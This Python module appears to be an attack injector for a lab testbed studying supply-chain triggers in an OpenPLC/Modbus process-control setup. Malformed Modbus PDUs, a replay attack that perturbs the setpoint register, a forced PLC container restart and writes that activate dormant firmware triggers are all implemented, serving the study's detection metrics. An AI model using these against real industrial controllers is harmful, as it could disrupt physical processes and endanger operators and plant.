"""Supply-chain attack injector — three trigger scenarios.

The three modes are *synthetic proxies* for distinct classes of dormant
supply-chain trigger; none of them downloads or executes real malware. They
exist to exercise specific observability channels under controlled conditions,
not to substitute for evaluation against a real injected payload (that
evaluation requires the dedicated hardware test rig identified as the
principal Future Work item in the paper).

The attacker container shares the HMI's network namespace (see docker-compose.yml).
This means attacker traffic enters the bridge from the HMI's veth interface,
modelling a tampered-HMI-on-the-supply-chain that emits malicious Modbus PDUs
as part of its normal operation, rather than an external on-network attacker
that would not exist in a post-deployment threat model.

malformed
    Trigger class: anomalous protocol sequence.
    The attacker emits Modbus/TCP PDUs that a benign HMI would never emit —
    reserved function codes, truncated MBAP headers, out-of-range writes to
    the setpoint register. Channel exercised: protocol anomalies (captured by
    the tcpdump sidecar in the PLC's namespace).

mutate
    Trigger class: post-activation runtime tampering.
    The attacker requests a forced restart of the PLC container via the Docker
    daemon socket — simulating a dormant payload whose trigger fires and whose
    effect is to reset the runtime (a watchdog-style denial of service). The
    PLC comes back up but the program is not auto-loaded by OpenPLC v3, so the
    process variable goes flat. Channels exercised: availability (restart
    visible to Docker engine events) and integrity (PV deviates from setpoint).

replay
    Trigger class: contextual timing/sequence.
    The attacker captures a window of HMI->PLC traffic and replays selected
    write-holding-register frames with the setpoint perturbed. Channels
    exercised: latency (re-injection disturbs the polling cadence) and
    integrity (setpoint perturbation produces PV drift).

All modes emit timestamped JSON-lines events to ${EVENTS_PATH} (default
/opt/troia/avaliacao/chaos_events.jsonl) that serve as ground truth for
metrics.scoring.

Usage:
    python -m attacker.inject <mode> [options]

    python -m attacker.inject malformed --plc plc:502 --count 30 --interval 6
    python -m attacker.inject mutate    --target troia-plc
    python -m attacker.inject replay    --plc plc:502 --capture-sec 30
"""

from __future__ import annotations

import argparse
import json
import os
import random
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path


def emit_event(events_path: Path, kind: str, scenario: str, extra: dict | None = None) -> None:
    events_path.parent.mkdir(parents=True, exist_ok=True)
    record = {
        "ts_ns": time.time_ns(),
        "kind": kind,
        "scenario": scenario,
    }
    if extra:
        record.update(extra)
    with events_path.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps(record) + "\n")


# =========================================================================
# Mode 1: malformed
# =========================================================================

MALFORMED_PAYLOADS: list[tuple[str, bytes]] = [
    # MBAP: txid=XXXX proto=0000 length=0006 unit=01 + PDU
    # PDU layout for FC=06 (write single HR): fc(1) + addr(2) + value(2)
    # tank_pid.st setpoint is at Modbus HR 1024 = 0x0400 (because OpenPLC v3
    # maps %MW0 to HR 1024). Out-of-range writes targeting that address are
    # the realistic "trigger by anomalous protocol sequence" probe.
    ("fc99_reserved",   bytes.fromhex("00010000000601") + bytes.fromhex("63") + b"\x04\x00\x00\x01"),
    ("fc127_reserved",  bytes.fromhex("00020000000601") + bytes.fromhex("7f") + b"\x04\x00\x00\x01"),
    ("truncated_header", bytes.fromhex("00030000")),  # only 4 bytes total
    ("length_mismatch", bytes.fromhex("0004000000FF01") + bytes.fromhex("03") + b"\x04\x00\x00\x01"),  # length=255 but payload short
    ("bad_proto_id",    bytes.fromhex("0005DEAD000601") + bytes.fromhex("03") + b"\x04\x00\x00\x01"),  # proto != 0
    ("write_oor_value", bytes.fromhex("0006000000060106") + b"\x04\x00\xff\xff"),  # write HR1024 = 65535 (oor for setpoint 0..1000)
    ("write_negative_via_underflow", bytes.fromhex("0007000000060106") + b"\x04\x00\x80\x00"),  # HR1024 = 32768
]


def mode_malformed(args, events_path: Path) -> int:
    host, port = args.plc.split(":")
    port = int(port)
    emit_event(events_path, "malformed_start", "malformed",
               {"target": args.plc, "count": args.count})
    for i in range(args.count):
        name, payload = random.choice(MALFORMED_PAYLOADS)
        try:
            with socket.create_connection((host, port), timeout=2.0) as s:
                s.sendall(payload)
                # Drain any response briefly.
                s.settimeout(0.5)
                try:
                    _ = s.recv(4096)
                except (TimeoutError, socket.timeout):
                    pass
            emit_event(events_path, "malformed_pdu", "malformed",
                       {"payload_name": name, "byte_len": len(payload), "seq": i})
            print(f"[malformed] {i+1}/{args.count} sent {name} ({len(payload)}B)")
        except Exception as exc:  # noqa: BLE001 — log and continue
            emit_event(events_path, "malformed_error", "malformed",
                       {"payload_name": name, "error": str(exc)})
            print(f"[malformed] error: {exc}", file=sys.stderr)
        time.sleep(args.interval)
    emit_event(events_path, "malformed_end", "malformed", {"count": args.count})
    return 0


# =========================================================================
# Mode 2: mutate (runtime restart via Docker daemon socket)
# =========================================================================
#
# The original design attached gdb to the OpenPLC runtime and patched the
# .text segment with NOPs. That required SYS_PTRACE on the attacker container
# and shared PID namespace with the PLC — both of which are deployment-time
# privileges that a real supply-chain Trojan would not have on its target
# device. The reviewers correctly flagged that as a threat-model mismatch.
#
# The replacement is conceptually closer to "a dormant payload triggers and
# the runtime is reset as a side-effect of its activation": we ask the Docker
# daemon to restart the PLC container. This requires only the standard
# /var/run/docker.sock bind-mount, which is a normal observability privilege,
# not a process-injection privilege. The behavioural signal that the
# observability layer must catch — a process restart followed by lost program
# state and a flat process variable — is identical.

def mode_mutate(args, events_path: Path) -> int:
    target = args.target
    emit_event(events_path, "mutate_start", "mutate",
               {"target": target, "mechanism": "docker_restart"})

    # `docker restart` is synchronous (waits for the container to stop and
    # come back up). The default timeout is 10 s; we override slightly larger
    # so OpenPLC's relatively slow startup does not race the cooldown phase.
    cmd = ["docker", "restart", "--time", "5", target]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
        rc = res.returncode
        stderr_tail = res.stderr[-400:] if res.stderr else ""
    except subprocess.TimeoutExpired:
        rc = -1
        stderr_tail = "docker restart timed out after 45 s"
    except FileNotFoundError:
        rc = -2
        stderr_tail = "docker CLI not available in attacker container"

    emit_event(events_path, "mutate_done", "mutate",
               {"target": target, "mechanism": "docker_restart",
                "rc": rc, "stderr_tail": stderr_tail})
    print(f"[mutate] docker restart {target} rc={rc}")
    return 0 if rc == 0 else 1


# =========================================================================
# Mode 3: replay (capture + replay with modification)
# =========================================================================

def mode_replay(args, events_path: Path) -> int:
    host, port = args.plc.split(":")
    port = int(port)
    pcap_path = Path("/tmp/troia_replay.pcap")

    emit_event(events_path, "replay_capture_start", "replay",
               {"target": args.plc, "capture_sec": args.capture_sec})
    cap = subprocess.Popen(
        ["tcpdump", "-i", "any", "-w", str(pcap_path), f"port {port}"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    # Give tcpdump a moment to start before generating the write traffic
    # we want it to record.
    time.sleep(1.0)
    # Emit a handful of benign FC=06 writes to the setpoint so the capture
    # has real Modbus write frames to replay. Without this the SCADA-LTS
    # HMI almost exclusively issues reads (FC=03/01) and replay produces no
    # mutable frames. We bracket the setpoint around its nominal value so
    # this pre-capture write does not itself constitute a "drift" event.
    try:
        for nudge in (498, 500, 502, 500):
            with socket.create_connection((host, port), timeout=2.0) as s:
                # MBAP txid=ABCD proto=0 length=6 unit=1 + FC06 + HR1024 + value
                pdu = bytes.fromhex("ABCD000000060106") + b"\x04\x00" + nudge.to_bytes(2, "big")
                s.sendall(pdu)
                s.settimeout(0.5)
                try:
                    _ = s.recv(64)
                except (TimeoutError, socket.timeout):
                    pass
            time.sleep(0.3)
    except Exception as exc:  # noqa: BLE001
        emit_event(events_path, "replay_seed_error", "replay", {"error": str(exc)})
    time.sleep(max(0, args.capture_sec - 3))
    cap.terminate()
    cap.wait(timeout=5)
    emit_event(events_path, "replay_capture_end", "replay",
               {"pcap": str(pcap_path)})

    # Replay phase: re-send captured TCP payloads with setpoint perturbation.
    # We use scapy in-band rather than tcpreplay for finer control.
    from scapy.all import PcapReader, Raw, TCP, IP  # type: ignore[import-not-found]
    sent = 0
    with PcapReader(str(pcap_path)) as reader:
        for pkt in reader:
            if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
                continue
            payload = bytes(pkt[Raw].load)
            if len(payload) < 8:
                continue
            # Only replay client->server (dport=502) writes.
            if pkt[TCP].dport != port:
                continue
            fc = payload[7]
            if fc not in (0x06, 0x10):  # write single/multiple holding registers
                continue
            # Mutate the value: bump setpoint by +200.
            # OpenPLC v3 maps %MW0 (setpoint) to HR 1024 = 0x0400.
            mutated = bytearray(payload)
            if len(mutated) >= 12 and fc == 0x06:
                hr = int.from_bytes(mutated[8:10], "big")
                if hr == 1024:  # setpoint
                    val = int.from_bytes(mutated[10:12], "big")
                    new_val = min(1000, val + 200)
                    mutated[10:12] = new_val.to_bytes(2, "big")
            try:
                with socket.create_connection((host, port), timeout=2.0) as s:
                    s.sendall(bytes(mutated))
                    s.settimeout(0.5)
                    try:
                        _ = s.recv(4096)
                    except (TimeoutError, socket.timeout):
                        pass
                emit_event(events_path, "replay_pdu", "replay",
                           {"fc": fc, "mutated": mutated != bytearray(payload)})
                sent += 1
            except Exception as exc:  # noqa: BLE001
                emit_event(events_path, "replay_error", "replay", {"error": str(exc)})
            if sent >= args.max_replays:
                break
            time.sleep(args.interval)
    emit_event(events_path, "replay_end", "replay", {"replayed": sent})
    print(f"[replay] sent {sent} mutated frames")
    return 0


# =========================================================================
# Entry
# =========================================================================

def mode_provoke_on(args, events_path: Path) -> int:
    """Reconstruct the operational context that activates the hidden trigger
    in ``tank_pid.st`` (Section V.G of the paper).

    The firmware contains a dormant payload that activates only when registers
    HR1032 and HR1033 simultaneously hold the magic values 17 and 42 for five
    consecutive scans (500 ms). In a real supply-chain payload these would be,
    e.g., a peer Modbus unit-id and a substation-frequency code that the
    adversary embeds at fabrication. This mode reconstructs that context by
    writing the magic values from the attacker container (which shares the
    HMI's network namespace, so the writes look as though the HMI itself
    produced them) and keeping them in place for the configured duration.
    """
    from pymodbus.client import ModbusTcpClient

    host, port = args.plc.split(":")
    port = int(port)
    emit_event(events_path, "provoke_on_start", "provoke_on",
               {"target": args.plc, "context_a": 17, "context_b": 42,
                "hold_sec": args.hold_sec})
    client = ModbusTcpClient(host, port=port, timeout=2.0)
    try:
        # connect() returns False (not raises) on failure — check explicitly.
        if not client.connect():
            raise RuntimeError(f"[provoke_on] Modbus connect to {args.plc} failed")
        # Write the magic context values that the firmware reads as its
        # activation condition (HR1032 == 17 AND HR1033 == 42).
        client.write_register(address=1032, value=17)
        client.write_register(address=1033, value=42)
        emit_event(events_path, "provoke_context_written", "provoke_on",
                   {"hr1032": 17, "hr1033": 42})
        t_end = time.time() + args.hold_sec
        # Re-affirm the context periodically so any benign write by the HMI
        # cannot accidentally clear it.
        while time.time() < t_end:
            try:
                client.write_register(address=1032, value=17)
                client.write_register(address=1033, value=42)
            except Exception as e:  # noqa: BLE001
                # Connection may have dropped; log and attempt one reconnect so
                # the next loop iteration can recover without aborting the hold.
                print(f"[provoke_on] write error: {e}; attempting reconnect", file=sys.stderr)
                try:
                    client.close()
                    client.connect()
                except Exception:
                    pass
            time.sleep(args.refresh_sec)
        emit_event(events_path, "provoke_on_end", "provoke_on",
                   {"duration_sec": args.hold_sec})
    finally:
        try:
            client.close()
        except Exception:  # noqa: BLE001
            pass
    return 0


def mode_provoke_off(args, events_path: Path) -> int:
    """Control arm for the killer demo. The attacker container is up but
    deliberately does NOT reconstruct the trigger context: HR1032 and HR1033
    remain at their default of zero, so the dormant trigger in ``tank_pid.st``
    never activates. This is the baseline against which the provoke-on arm
    is compared in the two-proportion z-test (Section V.G)."""
    emit_event(events_path, "provoke_off_start", "provoke_off",
               {"note": "no context reconstruction; trigger remains dormant"})
    # Sleep for the same wall-clock window the provoke-on arm holds the
    # context, so run durations match.
    time.sleep(args.hold_sec)
    emit_event(events_path, "provoke_off_end", "provoke_off",
               {"duration_sec": args.hold_sec})
    return 0


def mode_provoke_seq_on(args, events_path: Path) -> int:
    """Reconstruct the Class 2 hidden-trigger context: a monotonic +50
    increment landed on HR1035 (magic_seq) for five consecutive scans.

    The firmware's sequence-conditioned payload arms only after five
    successive +50 increments within roughly five scan cycles (500 ms).
    To make manifestation reliable under network jitter we write the
    five-step pattern repeatedly throughout the hold window."""
    from pymodbus.client import ModbusTcpClient

    host, port = args.plc.split(":")
    port = int(port)
    emit_event(events_path, "provoke_seq_on_start", "provoke_seq_on",
               {"target": args.plc, "pattern": [50, 100, 150, 200, 250],
                "hold_sec": args.hold_sec})
    client = ModbusTcpClient(host, port=port, timeout=2.0)
    try:
        # connect() returns False (not raises) on failure — check explicitly.
        if not client.connect():
            raise RuntimeError(f"[provoke_seq_on] Modbus connect to {args.plc} failed")
        t_end = time.time() + args.hold_sec
        cycles = 0
        while time.time() < t_end:
            # Five-step monotonic +50 sequence. Each write lands in the
            # next PLC scan; the firmware needs five consecutive matches.
            for val in (50, 100, 150, 200, 250):
                try:
                    client.write_register(address=1035, value=val)
                except Exception as e:  # noqa: BLE001
                    # Log and attempt one reconnect; next write attempt will
                    # surface any persistent failure.
                    print(f"[provoke_seq_on] write error: {e}; attempting reconnect", file=sys.stderr)
                    try:
                        client.close()
                        client.connect()
                    except Exception:
                        pass
                # Wait a bit longer than one scan (100ms) so each write
                # is observed on its own scan boundary.
                time.sleep(0.12)
            cycles += 1
            # Hold magic_seq at 250 briefly so trigger_seq_fired can
            # accumulate, then dip to zero to allow a fresh ramp on the
            # next cycle.
            time.sleep(0.5)
            try:
                client.write_register(address=1035, value=0)
            except Exception as e:  # noqa: BLE001
                print(f"[provoke_seq_on] reset error: {e}; attempting reconnect", file=sys.stderr)
                try:
                    client.close()
                    client.connect()
                except Exception:
                    pass
            time.sleep(0.5)
        emit_event(events_path, "provoke_seq_on_end", "provoke_seq_on",
                   {"duration_sec": args.hold_sec, "cycles": cycles})
    finally:
        try:
            client.close()
        except Exception:  # noqa: BLE001
            pass
    return 0


def mode_provoke_seq_off(args, events_path: Path) -> int:
    """Control arm for Class 2 (sequence-conditioned). The attacker is up
    but never writes the +50 increment pattern to magic_seq; the dormant
    Class 2 payload never activates."""
    emit_event(events_path, "provoke_seq_off_start", "provoke_seq_off",
               {"note": "no sequence reconstruction; Class 2 trigger remains dormant"})
    time.sleep(args.hold_sec)
    emit_event(events_path, "provoke_seq_off_end", "provoke_seq_off",
               {"duration_sec": args.hold_sec})
    return 0


def mode_provoke_env_on(args, events_path: Path) -> int:
    """Reconstruct the Class 3 hidden-trigger context: drive the process
    state itself (PV) into the target envelope (PV <= 250 sustained 1 s)
    by manipulating the operational setpoint.

    Unlike Class 1 and Class 2, the attacker does NOT write directly to
    a trigger register. Instead they set setpoint to a low value (~120),
    which causes the PID loop to close the valve, PV decays naturally
    below 250, and the firmware's environment-conditioned payload arms.
    This models a deployment-site trigger that fires on the device's
    operational environment rather than on a magic command."""
    from pymodbus.client import ModbusTcpClient

    host, port = args.plc.split(":")
    port = int(port)
    emit_event(events_path, "provoke_env_on_start", "provoke_env_on",
               {"target": args.plc, "setpoint_low": 120,
                "hold_sec": args.hold_sec})
    client = ModbusTcpClient(host, port=port, timeout=2.0)
    try:
        # connect() returns False (not raises) on failure — check explicitly.
        if not client.connect():
            raise RuntimeError(f"[provoke_env_on] Modbus connect to {args.plc} failed")
        # Write a low setpoint that the PID will track downward, dragging
        # PV into the trigger envelope (PV <= 250).
        client.write_register(address=1024, value=120)
        emit_event(events_path, "provoke_env_setpoint_set", "provoke_env_on",
                   {"sp": 120})
        t_end = time.time() + args.hold_sec
        # Re-affirm setpoint periodically so a benign HMI write cannot
        # restore the nominal value and silence the trigger envelope.
        while time.time() < t_end:
            try:
                client.write_register(address=1024, value=120)
            except Exception as e:  # noqa: BLE001
                # Log and attempt one reconnect; next loop iteration surfaces
                # any persistent failure rather than silently dropping it.
                print(f"[provoke_env_on] write error: {e}; attempting reconnect", file=sys.stderr)
                try:
                    client.close()
                    client.connect()
                except Exception:
                    pass
            time.sleep(args.refresh_sec)
        emit_event(events_path, "provoke_env_on_end", "provoke_env_on",
                   {"duration_sec": args.hold_sec})
    finally:
        try:
            client.close()
        except Exception:  # noqa: BLE001
            pass
    return 0


def mode_provoke_env_off(args, events_path: Path) -> int:
    """Control arm for Class 3 (environment-conditioned). The attacker is
    up but never manipulates the setpoint; the PID loop converges to its
    natural P-controller steady-state offset (PV ~350), which is above
    the trigger envelope. The Class 3 payload remains dormant."""
    emit_event(events_path, "provoke_env_off_start", "provoke_env_off",
               {"note": "setpoint untouched; PV stays at ~350; Class 3 trigger dormant"})
    time.sleep(args.hold_sec)
    emit_event(events_path, "provoke_env_off_end", "provoke_env_off",
               {"duration_sec": args.hold_sec})
    return 0


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument(
        "--events-path",
        default=os.environ.get("EVENTS_PATH", "/opt/troia/avaliacao/chaos_events.jsonl"),
        type=Path,
    )
    sub = p.add_subparsers(dest="mode", required=True)

    pm = sub.add_parser("malformed", help="send invalid Modbus PDUs")
    pm.add_argument("--plc", default="plc:502")
    pm.add_argument("--count", type=int, default=20)
    pm.add_argument("--interval", type=float, default=5.0)

    pmu = sub.add_parser("mutate", help="force a Docker-level restart of the PLC container, simulating a dormant-payload-triggered runtime reset")
    pmu.add_argument("--target", default="troia-plc",
                     help="name of the Docker container to restart (default: troia-plc)")

    pr = sub.add_parser("replay", help="capture + replay with mutation")
    pr.add_argument("--plc", default="plc:502")
    pr.add_argument("--capture-sec", type=int, default=30)
    pr.add_argument("--max-replays", type=int, default=20)
    pr.add_argument("--interval", type=float, default=3.0)

    pp_on = sub.add_parser("provoke_on", help="reconstruct trigger context (HR1032=17, HR1033=42)")
    pp_on.add_argument("--plc", default="plc:502")
    pp_on.add_argument("--hold-sec", type=int, default=180,
                       help="seconds to hold the trigger context (default 180)")
    pp_on.add_argument("--refresh-sec", type=float, default=2.0,
                       help="seconds between re-writes of the context registers")

    pp_off = sub.add_parser("provoke_off", help="control arm: no context written")
    pp_off.add_argument("--hold-sec", type=int, default=180)

    pp_seq_on = sub.add_parser("provoke_seq_on",
        help="reconstruct Class 2 (sequence-conditioned) trigger context")
    pp_seq_on.add_argument("--plc", default="plc:502")
    pp_seq_on.add_argument("--hold-sec", type=int, default=180)

    pp_seq_off = sub.add_parser("provoke_seq_off",
        help="control arm for Class 2 (no sequence written)")
    pp_seq_off.add_argument("--hold-sec", type=int, default=180)

    pp_env_on = sub.add_parser("provoke_env_on",
        help="reconstruct Class 3 (environment-conditioned) trigger context "
             "by driving setpoint low to force PV into the trigger envelope")
    pp_env_on.add_argument("--plc", default="plc:502")
    pp_env_on.add_argument("--hold-sec", type=int, default=180)
    pp_env_on.add_argument("--refresh-sec", type=float, default=2.0)

    pp_env_off = sub.add_parser("provoke_env_off",
        help="control arm for Class 3 (setpoint untouched)")
    pp_env_off.add_argument("--hold-sec", type=int, default=180)

    args = p.parse_args()
    handlers = {"malformed": mode_malformed, "mutate": mode_mutate, "replay": mode_replay,
                "provoke_on": mode_provoke_on, "provoke_off": mode_provoke_off,
                "provoke_seq_on": mode_provoke_seq_on,
                "provoke_seq_off": mode_provoke_seq_off,
                "provoke_env_on": mode_provoke_env_on,
                "provoke_env_off": mode_provoke_env_off}
    return handlers[args.mode](args, args.events_path)


if __name__ == "__main__":
    raise SystemExit(main())
